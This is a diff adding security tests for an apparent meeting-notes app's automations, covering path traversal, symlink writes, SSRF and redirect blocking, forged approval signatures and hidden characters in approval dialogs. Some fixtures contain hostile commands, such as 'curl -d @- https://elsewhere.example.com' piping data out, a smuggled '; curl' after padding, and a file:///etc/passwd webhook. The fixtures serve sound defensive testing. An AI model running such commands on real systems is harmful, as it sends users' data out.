@@ -1,10 +1,12 @@
 import { afterEach, expect, test } from 'bun:test';
-import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'fs';
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from 'fs';
 import { tmpdir } from 'os';
-import { join } from 'path';
+import { dirname, join } from 'path';
 import {
   afterMeetingReady,
+  approvalQuestion,
   automationApprovalsPath,
+  commandProgram,
   createAutomation,
   ensureAutomationsDirectory,
   loadAutomations,
@@ -14,8 +16,12 @@ import {
   runFailure,
   runShellAction,
   updateAutomation,
+  writeTargetPath,
   type AutomationApprovalRequest,
 } from '../src/automations.ts';
+import { automationState } from '../src/SettingsScreen.tsx';
+import { isPublicAddress, postWebhook } from '../src/webhook-post.ts';
+import { approvalKey, type KeychainCommand } from '../src/approval-key.ts';
 import { ensureExtractorsDirectory } from '../src/extractors.ts';
 import type { runHumainMeeting } from '../src/humain-client.ts';
 import { createMeetingArtifact, loadMeetingArtifact, saveMeetingArtifact } from '../src/meeting-artifact.ts';
@@ -68,7 +74,7 @@ calendar: Work
       { kind: 'shell', command: './file.sh --today' }, { kind: 'webhook', url: 'https://hooks.example.com/x' }] });
   expect(() => parseAutomation('---\nwhen: daily\n---\n- write: x', '/x/a.md')).toThrow('only trigger');
   expect(() => parseAutomation('---\n---\nsend it somewhere', '/x/a.md')).toThrow('line 1 is not an action');
-  expect(() => parseAutomation('---\n---\n- webhook: file:///etc/passwd', '/x/a.md')).toThrow('http or https');
+  expect(() => parseAutomation('---\n---\n- webhook: file:///etc/passwd', '/x/a.md')).toThrow('webhooks must be https');
   expect(() => parseAutomation('---\nname: Nothing\n---\n', '/x/a.md')).toThrow('has no actions');
 });
 
@@ -124,7 +130,8 @@ test('shell and webhook actions ask first, once per version of the file, and rem
     notes: { status: 'final', items: [{ type: 'decision', text: 'Ship on Friday.', evidenceSegmentIds: ['s000001'] }] },
     transcript: [{ id: 's000001', speaker: 'Microphone', text: 'We ship on Friday.' }] });
   expect(posts.map((post) => post.url)).toEqual(['https://hooks.example.com/x', 'https://hooks.example.com/x']);
-  expect(JSON.parse(readFileSync(automationApprovalsPath(env), 'utf8')).approvals).toHaveProperty(loadAutomations(root, env).automations[0]!.hash);
+  expect(Object.values(JSON.parse(readFileSync(automationApprovalsPath(env), 'utf8')).approvals))
+    .toEqual([{ name: 'Send', decision: 'allow', at: expect.any(String), signature: expect.stringMatching(/^[0-9a-f]{64}$/u) }]);
 
   // Any edit to the file asks again; a "no" is remembered and nothing is sent.
   updateAutomation(root, 'Send', { actions: [{ kind: 'shell', command: './other.sh' }] }, env);
@@ -190,4 +197,236 @@ test('a failed run says why in plain words, and whether trying again could help'
   expect(runFailure(run('Archive', 'The operation timed out.'))).toEqual({ text: "The server at crm.example.com didn't answer.", retry: true });
   expect(runFailure(run('Post to the CRM', 'the server refused it (403)'))).toEqual({ text: 'The CRM refused it (403).', retry: false });
   expect(runFailure(run('Script', 'exit 1', 'shell'))).toEqual({ text: 'exit 1', retry: false });
+});
+
+test('a write never replaces a file Seashell did not make, never follows a link, and keeps its own file private', async () => {
+  const { home, root, record, env } = library();
+  const folder = join(home, 'Notes');
+  mkdirSync(folder);
+  const theirs = join(folder, '2026-10-05 Weekly sync.md');
+  writeFileSync(theirs, 'Notes I wrote myself.\n');
+  // A link where the file would go, pointing at something else that must stay as it is.
+  const elsewhere = mkdtempSync(join(tmpdir(), 'seashell-elsewhere-'));
+  roots.push(elsewhere);
+  const victim = join(elsewhere, 'settings.md');
+  writeFileSync(victim, 'Do not touch.\n');
+  symlinkSync(victim, join(folder, `${record.id}.md`));
+  automation(env, 'save.md', `---\nname: Save\n---\n- write: ${folder}\n- write: ${folder}/{id}.md\n`);
+  const [run] = await runAutomations(root, record.id, { env, trigger: 'manual' });
+  expect(run!.actions.map((action) => [action.status, action.detail])).toEqual([
+    ['ok', join(folder, '2026-10-05 Weekly sync (2).md')], ['ok', join(folder, `${record.id} (2).md`)]]);
+  expect(readFileSync(theirs, 'utf8')).toBe('Notes I wrote myself.\n');
+  expect(readFileSync(victim, 'utf8')).toBe('Do not touch.\n');
+  const ours = join(folder, '2026-10-05 Weekly sync (2).md');
+  expect(statSync(ours).mode & 0o777).toBe(0o600);
+  // Run again, Seashell replaces the file it wrote for this meeting; one changed since is kept, and the notes go beside it.
+  writeFileSync(join(folder, `${record.id} (2).md`), 'Edited by hand.\n');
+  const [again] = await runAutomations(root, record.id, { env, trigger: 'manual' });
+  expect(again!.actions.map((action) => action.detail)).toEqual([ours, join(folder, `${record.id} (3).md`)]);
+  expect(readFileSync(join(folder, `${record.id} (2).md`), 'utf8')).toBe('Edited by hand.\n');
+  expect(readdirSync(folder).sort()).toEqual(['2026-10-05 Weekly sync (2).md', '2026-10-05 Weekly sync.md',
+    `${record.id} (2).md`, `${record.id} (3).md`, `${record.id}.md`]);
+});
+
+test('a write outside the Sea Shell folder asks first, like shell and webhook, and still replaces nothing', async () => {
+  const { root, record, env } = library();
+  const outside = mkdtempSync(join(tmpdir(), 'seashell-outside-'));
+  roots.push(outside);
+  const settings = join(outside, 'CLAUDE.md');
+  writeFileSync(settings, 'Agent instructions.\n');
+  automation(env, 'save.md', `---\nname: Save\n---\n- write: ${settings}\n`);
+  const asked: AutomationApprovalRequest[] = [];
+  const ask = (answer: 'allow' | undefined) => async (request: AutomationApprovalRequest) => { asked.push(request); return answer; };
+  const [waiting] = await runAutomations(root, record.id, { env, trigger: 'manual', ask: ask(undefined) });
+  expect(waiting!.actions[0]).toMatchObject({ status: 'skipped', detail: expect.stringContaining('Waiting for your approval') });
+  expect(asked).toEqual([{ automation: 'Save', meeting: 'Weekly sync', actions: [`Save to: ${settings}`] }]);
+  expect(readdirSync(outside)).toEqual(['CLAUDE.md']);
+  const [allowed] = await runAutomations(root, record.id, { env, trigger: 'manual', ask: ask('allow') });
+  expect(allowed!.actions[0]).toMatchObject({ status: 'ok', detail: join(outside, 'CLAUDE (2).md') });
+  expect(readFileSync(settings, 'utf8')).toBe('Agent instructions.\n');
+});
+
+test('a title from the calendar cannot step out of the folder or hide characters; bad paths do not load', () => {
+  const record = { id: 'weekly-sync', createdAt: '2026-10-05T09:00:00Z' };
+  expect(writeTargetPath('/notes/{title}/{date}.md', record, '../../.ssh/authorized_keys')).toBe('/notes/ssh authorized keys/2026-10-05.md');
+  expect(writeTargetPath('/notes', record, 'Plan \u202Egnp.exe\u0000 / Q3: ready?')).toBe('/notes/2026-10-05 Plan gnp exe Q3 ready.md');
+  expect(writeTargetPath('/notes', record, '..')).toBe('/notes/2026-10-05 Meeting.md');
+  expect(() => writeTargetPath('/notes/{id}.md', { ...record, id: '../x' }, 'T')).toThrow('meeting ID');
+  for (const [target, problem] of [['~/Notes/../.claude', 'step up'], ['Notes', 'starting with ~/ or /'], ['~/Notes\u202E', 'control characters']]) {
+    expect(() => parseAutomation(`---\nname: Bad\n---\n- write: ${target}\n`, '/x/bad.md')).toThrow(problem);
+  }
+});
+
+test('an automation an agent made reads as off until its owner turns it on in the file', () => {
+  const made = parseAutomation('---\nname: Post\nenabled: false\nmade-by: agent\n---\n- webhook: https://hooks.example.com/x\n', '/x/post.md');
+  expect(made).toMatchObject({ enabled: false, by: 'agent' });
+  expect(automationState(made)).toBe('Off: made by an agent; turn on in the file');
+  expect(automationState({ ...made, enabled: true })).toBe('On');
+  expect(automationState({ enabled: false })).toBe('Off');
+});
+
+test('a webhook goes only to the address in the file: no redirects, https, and nothing local unless written so', async () => {
+  const { root, record, env } = library();
+  const received: string[] = [];
+  const elsewhere = Bun.serve({ hostname: '127.0.0.1', port: 0, fetch: async (request) => { received.push(await request.text()); return new Response('ok'); } });
+  const hook = Bun.serve({ hostname: '127.0.0.1', port: 0,
+    fetch: () => new Response(null, { status: 307, headers: { location: `http://127.0.0.1:${elsewhere.port}/stolen` } }) });
+  try {
+    // Plain http reaches this Mac only when the file says so; the server's redirect is an answer, not followed.
+    automation(env, 'post.md', `---\nname: Post to the CRM\n---\n- webhook: http://127.0.0.1:${hook.port}/hook\n`);
+    const [run] = await runAutomations(root, record.id, { env, trigger: 'manual', ask: async () => 'allow' });
+    expect(runFailure(run!)).toEqual({ text: 'The CRM refused it (307).', retry: false });
+    expect(run!.actions[0]!.detail).toStartWith('the server refused it (307)');
+    expect(received).toEqual([]);
+  } finally { hook.stop(true); elsewhere.stop(true); }
+
+  // A name that resolves to this Mac or the local network is refused before anything is sent.
+  for (const address of ['127.0.0.1', '10.1.2.3', '::1', 'fd00::5', '::ffff:192.168.1.4']) {
+    const post = postWebhook(async () => [{ address, family: address.includes(':') ? 6 : 4 }]);
+    await expect(post('https://hooks.example.test/x', { method: 'POST', body: '{}' })).rejects.toThrow('on this Mac or the local network');
+  }
+  for (const [url, ok] of [['http://hooks.example.com/x', false], ['ftp://hooks.example.com/x', false], ['http://localhost:8080/x', true],
+    ['http://[::1]:9000/x', true], ['https://192.168.1.20/x', true], ['https://hooks.example.com/x', true]] as const) {
+    const parse = () => parseAutomation(`---\nname: Hook\n---\n- webhook: ${url}\n`, '/x/hook.md');
+    if (ok) parse(); else expect(parse).toThrow('webhooks must be https');
+  }
+});
+
+test('only internet addresses count as public', () => {
+  for (const address of ['8.8.8.8', '1.1.1.1', '2606:4700:4700::1111', '::ffff:8.8.8.8']) expect(isPublicAddress(address)).toBe(true);
+  for (const address of ['127.0.0.1', '10.0.0.1', '172.16.5.4', '192.168.0.1', '169.254.169.254', '100.64.0.1', '0.0.0.0', '224.0.0.1',
+    '255.255.255.255', '::', '::1', 'fe80::1', 'fc00::1', 'fd12:3456::1', 'ff02::1', '::ffff:127.0.0.1', '64:ff9b::a00:1', '2002:c0a8:101::1',
+    '2001:db8::1', 'not an address']) {
+    expect(isPublicAddress(address)).toBe(false);
+  }
+});
+
+test('an approval written into the file by anything but Seashell counts for nothing', async () => {
+  const { root, record, env } = library();
+  automation(env, 'send.md', '---\nname: Send\n---\n- shell: ./file.sh\n');
+  const { hash } = loadAutomations(root, env).automations[0]!;
+  const forged = { name: 'Send', decision: 'allow', at: '2026-10-05T09:00:00Z' };
+  mkdirSync(dirname(automationApprovalsPath(env)), { recursive: true });
+  // As the old format wrote it, and as the new one does, with a made-up signature.
+  writeFileSync(automationApprovalsPath(env), JSON.stringify({ schemaVersion: 1, approvals: { [hash]: forged } }));
+  const ran: string[] = [];
+  const options = { env, trigger: 'manual' as const, shell: async (command: string) => { ran.push(command); return { code: 0 }; } };
+  expect((await runAutomations(root, record.id, options))[0]!.actions[0]!.status).toBe('skipped');
+  writeFileSync(automationApprovalsPath(env), JSON.stringify({ schemaVersion: 2,
+    approvals: Object.fromEntries(['a', 'b'].map((id) => [id.repeat(64), { ...forged, signature: '0'.repeat(64) }])) }));
+  expect((await runAutomations(root, record.id, options))[0]!.actions[0]!.status).toBe('skipped');
+  expect(ran).toEqual([]);
+  // Seashell's own yes is signed, and holds.
+  await runAutomations(root, record.id, { ...options, ask: async () => 'allow' });
+  await runAutomations(root, record.id, options);
+  expect(ran).toEqual(['./file.sh', './file.sh']);
+});
+
+test('an approved script that changes asks again, and the dialog names the file that runs', async () => {
+  const { home, root, record, env } = library();
+  const script = join(home, 'bin', 'file-call.sh');
+  mkdirSync(dirname(script));
+  writeFileSync(script, '#!/bin/sh\ncat > /dev/null\n', { mode: 0o700 });
+  automation(env, 'file.md', `---\nname: File it\n---\n- shell: SEASHELL_MODE=fast "${script}" --today\n`);
+  const asked: string[][] = [];
+  const ran: string[] = [];
+  const options = (answer?: 'allow') => ({ env, trigger: 'manual' as const,
+    ask: async (request: AutomationApprovalRequest) => { asked.push(request.actions); return answer; },
+    shell: async (command: string) => { ran.push(command); return { code: 0 }; } });
+  await runAutomations(root, record.id, options('allow'));
+  expect(asked).toEqual([[`Run: SEASHELL_MODE=fast "${script}" --today (runs ${realpathSync(script)})`]]);
+  await runAutomations(root, record.id, options());
+  expect([asked.length, ran.length]).toEqual([1, 2]);
+  writeFileSync(script, '#!/bin/sh\ncurl -d @- https://elsewhere.example.com\n', { mode: 0o700 });
+  await runAutomations(root, record.id, options());
+  expect([asked.length, ran.length]).toEqual([2, 2]);
+});
+
+test('the program a command runs is found as the shell would find it', () => {
+  const folder = mkdtempSync(join(tmpdir(), 'seashell-program-'));
+  roots.push(folder);
+  writeFileSync(join(folder, 'tool'), '#!/bin/sh\n', { mode: 0o700 });
+  const tool = realpathSync(join(folder, 'tool'));
+  expect(commandProgram('tool --x', undefined, folder)).toBe(tool);
+  expect(commandProgram(`A=1 B='two words' ${join(folder, 'tool')}`, undefined, '')).toBe(tool);
+  expect(commandProgram(`'${folder}/to'ol | wc`, undefined, '')).toBe(tool);
+  expect(commandProgram('./tool', folder, '')).toBe(tool);
+  expect(commandProgram('./tool', undefined, '')).toBeUndefined();
+  expect(commandProgram('$TOOL --x', undefined, folder)).toBeUndefined();
+  expect(commandProgram('missing', undefined, folder)).toBeUndefined();
+});
+
+test('a shell action gets a minimal environment, never Seashell\'s own secrets', async () => {
+  const scratch = mkdtempSync(join(tmpdir(), 'seashell-shell-env-'));
+  roots.push(scratch);
+  process.env.SEASHELL_TEST_SECRET = 'sk-made-up';
+  try {
+    const out = join(scratch, 'env.txt');
+    expect(await runShellAction(`env > ${JSON.stringify(out)}`, '{}', { SEASHELL_MEETING_ID: 'x', SEASHELL_MEETING_DIR: scratch }, scratch)).toEqual({ code: 0 });
+    const names = readFileSync(out, 'utf8').trim().split('\n').map((line) => line.split('=')[0]!);
+    // sh adds PWD, SHLVL and _ itself.
+    expect(names.filter((name) => !['PWD', 'OLDPWD', 'SHLVL', '_'].includes(name)).sort())
+      .toEqual(['HOME', 'LANG', 'PATH', 'SEASHELL_MEETING_DIR', 'SEASHELL_MEETING_ID', 'TMPDIR']);
+  } finally { delete process.env.SEASHELL_TEST_SECRET; }
+});
+
+test('approvals are signed with a key from the Keychain, or a private file beside them when it is not there', () => {
+  const { home } = library();
+  const items = new Map<string, string>();
+  const calls: string[] = [];
+  const keychain: KeychainCommand = (args) => {
+    calls.push(args[0]!);
+    const service = args[args.indexOf('-s') + 1]!;
+    if (args[0] === 'add-generic-password') { items.set(service, args[args.indexOf('-w') + 1]!); return { status: 0, stdout: '' }; }
+    return items.has(service) ? { status: 0, stdout: `${items.get(service)}\n` } : { status: 44, stdout: '' };
+  };
+  const approvals = join(home, 'Support', 'automation-approvals.json');
+  const first = approvalKey(approvals, {}, keychain);
+  expect(first.store).toBe('keychain');
+  expect(approvalKey(approvals, {}, keychain).key.equals(first.key)).toBe(true);
+  expect(calls).toEqual(['find-generic-password', 'add-generic-password', 'find-generic-password', 'find-generic-password']);
+  expect(existsSync(join(home, 'Support', 'automation-approvals.key'))).toBe(false);
+  const locked = approvalKey(approvals, {}, () => ({ status: 51, stdout: '' }));
+  expect(locked).toMatchObject({ store: 'file', note: expect.stringContaining('The Keychain was not available (security exited 51)') });
+  expect(statSync(join(home, 'Support', 'automation-approvals.key')).mode & 0o777).toBe(0o600);
+  expect(approvalKey(approvals, {}, undefined).key.equals(locked.key)).toBe(true);
+});
+
+test('a meeting made private while its automation runs sends nothing more', async () => {
+  const { home, root, record, env } = library();
+  const folder = join(home, 'Notes');
+  automation(env, 'send.md', `---\nname: Send\n---\n- shell: ./file.sh\n- webhook: https://hooks.example.com/x\n- write: ${folder}\n`);
+  const posted: string[] = [];
+  let asked = 0;
+  const [run] = await runAutomations(root, record.id, { env, trigger: 'manual',
+    ask: async () => { asked++; return 'allow'; },
+    // The owner turns AI off for the meeting while the first action runs.
+    shell: async () => { saveMeetingArtifact(root, { ...loadMeetingArtifact(root, record.id)!, ai: { off: true } }); return { code: 0 }; },
+    fetch: (async (url: string) => { posted.push(url); return new Response(null, { status: 204 }); }) as unknown as typeof fetch });
+  expect(run!.actions.map((action) => [action.kind, action.status, action.detail])).toEqual([
+    ['shell', 'ok', undefined], ['webhook', 'skipped', 'The meeting was made private, so this was not sent.'],
+    ['write', 'skipped', 'The meeting was made private, so this was not sent.']]);
+  expect([posted, existsSync(folder), asked]).toEqual([[], false, 1]);
+
+  // Made private while the dialog was open: nothing runs, even with a yes.
+  saveMeetingArtifact(root, { ...loadMeetingArtifact(root, record.id)!, ai: undefined });
+  automation(env, 'send.md', '---\nname: Send\n---\n- shell: ./other.sh\n');
+  const ran: string[] = [];
+  const [later] = await runAutomations(root, record.id, { env, trigger: 'manual',
+    ask: async () => { saveMeetingArtifact(root, { ...loadMeetingArtifact(root, record.id)!, ai: { off: true } }); return 'allow'; },
+    shell: async (command: string) => { ran.push(command); return { code: 0 }; } });
+  expect([later!.actions[0]!.status, ran]).toEqual(['skipped', []]);
+});
+
+test('the approval dialog shows a command as it will run: no hidden characters, no padding, nothing cut off unsaid', () => {
+  const question = approvalQuestion({ automation: 'File\u200B it', meeting: 'Weekly\nsync\u202E',
+    actions: ['Run: ./safe.sh\u202E hs.live/ \u2066 --x', 'Run: ./a.sh\t\t;\r\n          curl -d @- https://elsewhere.example.com',
+      `Send to: https://hooks.example.com/${'x'.repeat(500)}`] });
+  expect(question).not.toMatch(/[\p{Cc}\p{Cf}](?<!\n)/u);
+  expect(question.split('\n')).toEqual([
+    'The automation “File it” wants to send “Weekly sync” outside Seashell:', '',
+    'Run: ./safe.sh hs.live/ --x',
+    'Run: ./a.sh ; curl -d @- https://elsewhere.example.com',
+    `Send to: https://hooks.example.com/${'x'.repeat(365)}… (135 more characters: read the automation's file before allowing it)`, '',
+    'Allow it? Seashell asks again if the automation changes.']);
 });
